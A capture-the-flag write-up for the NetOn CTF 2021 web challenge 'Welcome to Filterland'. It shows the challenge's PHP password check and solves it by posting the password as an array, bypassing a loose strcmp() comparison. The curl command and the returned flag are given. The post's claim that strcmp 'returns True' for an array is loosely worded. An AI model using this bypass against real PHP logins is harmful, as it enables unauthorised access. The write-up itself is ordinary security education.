---
title: NetOn CTF 2021 - Welcome to Filterland
category: CTF
tags: web PHP
hidden_tags: write-up
excerpt_separator: <!--more-->
---

Web -- 208 pts (24 solves) -- Chall author: eljoselillo7

Simple web challenge where we need to bypass the PHP strcmp() function.

<!--more-->

## Challenge

![](/assets/ctf/Web%20-%20Welcome%20to%20FilterLand.png)

## Solution

The website asks us for a password, nothing more, nothing less. By using the browser inspect tool (F-12) we see it posts our input to check.php. It also tells us they have made the PHP file available to us, so of course, we take a look :).

```php
<?php
    $FLAG =  (file_get_contents("/flag.txt")); //SECRET
    $PASSWORD = $_POST['password']; //User password

    if(isset($PASSWORD)){
    
    $PASSWORD = str_replace("s4cuRe_p4sW0rD","Nice_try!",$PASSWORD); //Replace

    if(strcmp('s4cuRe_p4sW0rD', $PASSWORD) == 0){ //Check
            
            echo $FLAG;
        
        }
        else{
            header("Location: /fail.html");
            die();
        }

    }
    else {
        echo "Give me what I'm looking for ):";
    }

?>
```

So the correct password is 's4cuRe_p4sW0rD', but they filter it out of our responses, how cheeky :c. Fortunately, or rather unfortunately, there is a vulnerability to the PHP strcmp functions. If instead of a string, we pass on something PHP recognises as a list it will return True, regardless of our input :).

I first tried to use HTML by going to the link
```
http://167.99.129.209:8000/check.php?password[]=oops
```
However, this did not work so I used curl instead
```sh
$ curl -d password[]=oops 167.99.129.209:8000/check.php
```
which happily returns our desired flag
```
NETON{arrays_FOR_the_WIN!}
```